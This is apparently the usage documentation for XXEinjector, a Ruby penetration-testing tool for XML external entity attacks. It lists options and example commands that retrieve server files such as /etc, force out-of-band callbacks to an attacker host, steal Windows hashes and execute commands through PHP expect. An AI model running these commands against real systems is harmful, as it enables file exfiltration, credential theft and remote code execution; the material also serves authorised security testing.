XXEinjector by Jakub Palaczynski

XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.

Options:<br />
  --host	Mandatory - our IP address for reverse connections. (--host=192.168.0.2)<br />
  --file	Mandatory - File containing valid HTTP request with xml. You can also mark with "XXEINJECT" a point where DTD should be injected. (--file=/tmp/req.txt)<br />
  --path	Mandatory if enumerating directories - Path to enumerate. (--path=/etc)<br />
  --brute	Mandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)<br />

  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)<br />
  --direct  Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)<br />
  --2ndfile		File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)<br />
  --phpfilter		Use PHP filter to base64 encode target file before sending.<br />
  --enumports		Enumerating unfiltered ports for reverse connection. Specify value "all" to enumerate all TCP ports. (--enumports=21,22,80,443,445)<br />

  --hashes	Steals Windows hash of the user that runs an application.<br />
  --expect	Uses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)<br />
  --upload	Uploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)<br />
  --xslt	Tests for XSLT injection.<br />

  --ssl		Use SSL.<br />
  --proxy	Proxy to use. (--proxy=127.0.0.1:8080)<br />
  --httpport	Set custom HTTP port. (--httpport=80)<br />
  --ftpport	Set custom FTP port. (--ftpport=21)<br />
  --gopherport	Set custom gopher port. (--gopherport=70)<br />
  --jarport	Set custom port for uploading files using jar. (--jarport=1337)<br />
  --xsltport	Set custom port for XSLT injection test. (--xsltport=1337)<br />

  --urlencode	URL encode injected DTD. This is default for URI.<br />
  --nodtd	If you want to put DTD in request by yourself. Specify "--dtd" to show how DTD should look like.<br />
  --output Output file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)<br />
  --timeout	Timeout for receiving file/directory content. (--timeout=20)<br />
  --fast	Skip asking what to enumerate. Prone to false-positives.<br />
  --verbose	Show verbose messages.<br />

Example usage:<br />
  Enumerating /etc directory in HTTPS application:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl<br />
  Enumerating /etc directory using gopher for OOB method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher<br />
  Second order exploitation:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt<br />
  Bruteforcing files using HTTP out of band method:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http<br />
  Enumerating using direct exploitation:<br />
  ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK<br />
  Enumerating unfiltered ports:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all<br />
  Stealing Windows hashes:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --hashes<br />
  Uploading files using Java jar:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf<br />
  Executing system commands using PHP expect:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls<br />
  Testing for XSLT injection:<br />
  ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --xslt<br />
  Log requests only:<br />
  ruby XXEinjector.rb --logger --oob=http --output=/tmp/out.txt<br />
